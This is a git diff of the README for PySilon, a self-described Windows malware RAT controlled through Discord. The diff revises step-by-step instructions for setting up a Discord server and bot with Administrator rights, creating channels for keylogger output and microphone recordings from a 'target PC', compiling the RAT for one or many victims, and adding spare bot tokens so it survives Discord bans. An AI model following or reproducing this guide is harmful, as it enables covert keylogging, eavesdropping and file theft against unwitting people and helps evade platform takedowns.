@@ -38,10 +38,11 @@
 - update itself (ToDo)
 
 # Preparation
-This malware is designed for Windows and because of some pip packages are available only on Windows (maight be changed in future for Linux support), I'm afraid that you can't compile it on Linux (at least with compiler.py):<br />
+This malware is designed for Windows and because of some pip packages are available only on Windows (maight be changed in future for Linux support), I'm afraid that you can't compile it on Linux (at least with compiler.py):<br /><br />
 `git clone https://github.com/mategol/pysilon-malware`<br />
-`pip install -r requirements.txt`<br />
-<a href="https://github.com/mategol/pysilon-malware#setup">`Follow the Setup instructions`</a>
+**Create Virtual Environment *(important)* - tutorial below**<br />
+**Install all requirements**<br />
+<a href="https://github.com/mategol/pysilon-malware#setup">`Follow the Setup instructions (also important)`</a>
 
 # Available commands
   <a href="https://github.com/mategol/pysilon-malware#ss">`.ss`</a> - take screenshot at any time<br />
@@ -63,28 +64,20 @@ This malware is designed for Windows and because of some pip packages are availa
 
 <br />\* command available on file-related channel only
 
+
 # Setup
 
 <b>This process consists of 2 stages:</b>
 > <a href="https://github.com/mategol/pysilon-malware#prepare-discord-server-and-discord-bot">1. Prepare Discord server and Discord BOT</a><br />
 > <a href="https://github.com/mategol/pysilon-malware#run-toolscompilerpy-and-enter-all-needed-values-to-successfully-build-rat-windows-executable">2. Compile malware to Windows executable</a><br />
 
-<span align='center'>
+### Creating a Discord Server for controlling the malware
 
-### Prepare Discord server and Discord BOT
+<span align='center'>
 
 > First of all, you need Discord server as environment for remote controlling PySilon. In order to do that, create new one:
 
 <p align='center'><img src="https://user-images.githubusercontent.com/44233157/203310675-fc589377-63f7-43f0-b69e-ec7bfaa75b5d.jpg" /></p>
-
-> Then, create 4 text-channels and 1 voice-channel for different use:<br />
-> • main -> for main KeyLogger output and general commands<br />
-> • spam-gaming -> for filtered KeyLogger output while target is (for example) playing game<br />
-> • recordings -> for storing microphone recordings<br />
-> • file-related -> for everything that is related to files<br />
-> • Live microphone -> for streaming live microphone input
-
-<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203312123-2d5015a2-6a2e-46fd-8104-f1fc5ff409a9.jpg" /></p>
 
 > Then, go to <a href="https://discord.com/developers/applications">Discord Developer Portal</a> and create new application:
 
@@ -106,7 +99,7 @@ This malware is designed for Windows and because of some pip packages are availa
 
 <p align='center'><img src="https://user-images.githubusercontent.com/44233157/203318137-fe379bb9-e94b-4572-80f4-783f32c2d81f.png" /></p>
 
-> THen, check "bot" scope and "Administrator" permissions:
+> Then, check "bot" scope and "Administrator" permissions:
 
 <p align='center'><img src="https://user-images.githubusercontent.com/44233157/203318332-27c1a692-3e56-41e4-b7df-0f0289768806.png" /></p>
 
@@ -114,27 +107,83 @@ This malware is designed for Windows and because of some pip packages are availa
 
 <p align='center'><img src="https://user-images.githubusercontent.com/44233157/203319649-e4db527a-741e-4436-8bb1-d7fe674b0e2b.jpg" /></p>
 
-> As you can see, BOT is now in the server:
+> As you can see, BOT is now on the server:
 
 <p align='center'><img src="https://user-images.githubusercontent.com/44233157/203319836-e7aeb93f-3c22-491b-aea2-cd2aaa41d65d.png" /><br /></p>
-
-### Get channel IDs for proper messaging
 
 > You need to enable "Developer mode" in Discord settings:
 
 <p align='center'><img src="https://user-images.githubusercontent.com/44233157/203321226-e01e4c39-678b-4f77-9bee-1607ad43c1d0.jpg" /></p>
 
-<br />
-  
-> To copy channel ID, just right-click on channel and click "Copy ID".
-  
-<br />
+</span>
 
-### `Run compiler.py and enter all needed values to successfully build RAT Windows executable.`
-if you encounter any errors, please raise an Issue and I will be happy to help.
-<br />
+### Continuation (single target)
 
+> Create 5 text-channels and 1 voice-channel for different use:<br />
+> • info -> for information about target PC<br />
+> • main -> for main KeyLogger output and general commands<br />
+> • spam-gaming -> for filtered KeyLogger output while target is (for example) playing game<br />
+> • recordings -> for storing microphone recordings<br />
+> • file-related -> for everything that is related to files<br />
+> • Live microphone -> for streaming live microphone input
+
+<p align='center'><img src="https://user-images.githubusercontent.com/44233157/205751962-eb6b48ab-78ba-4c4b-bff4-66fbfa9cb2dc.png" /></p>
+
+<br />
 <span align='center'>
+
+> To copy channel ID, just right-click on channel and click "Copy ID".
+
+</span><br />
+
+<span align='left'>
+
+### Continuation (multiple targets)
+
+> Right-click on controller Server and click "Copy ID" (save for later use)
+
+</span>
+<span align='left'>
+<br />
+
+# Building standalone executable
+
+</span>
+
+### To be able to compile your malware, you need to create Python Virtual Environment:
+`python -m venv pysilon`
+<br /><br />
+
+### Then, activate it with:
+`pysilon\Scripts\activate.bat`
+<br /><br />
+
+### If you see "(pysilon)" at the beginning of CMD prompt, it means that so far so good.
+### Now, install all requirements with:
+`pip install -r requirements.txt`<br />
+`pip install pyinstaller`
+<br /><br />
+
+### Now, you are ready to run `compiler.py`:
+`python compiler.py`
+<br /><br />
+
+### You will be asked how do you want to build the malware:
+`[1] - single` -> RAT will be designed for only one target PC<br />
+`[2] - multiple` -> RAT will be designed to run on multiple PCs<br />
+> If you choose `[1]`, you will be prompted to specify channel-IDs for controlling the malware
+
+> But if you choose `[2]`, you will need to specify only Discord Server ID (+ BOT-token and naming info)
+
+<br />
+
+### Multiple Discord BOT tokens
+**You can add more than one BOT-token to malware in case of the first one getting banned by Discord (you can add up to three different tokens for now). If first token gets banned, PySilon will automatically run with another one (if you set them in compiler.py)**
+
+<br /><br />
+
+`If you encounter any errors, please raise an Issue and I will be happy to help as soon as possible.`
+<br />
 
 > **`Now, everything is ready for a showtime`**
 
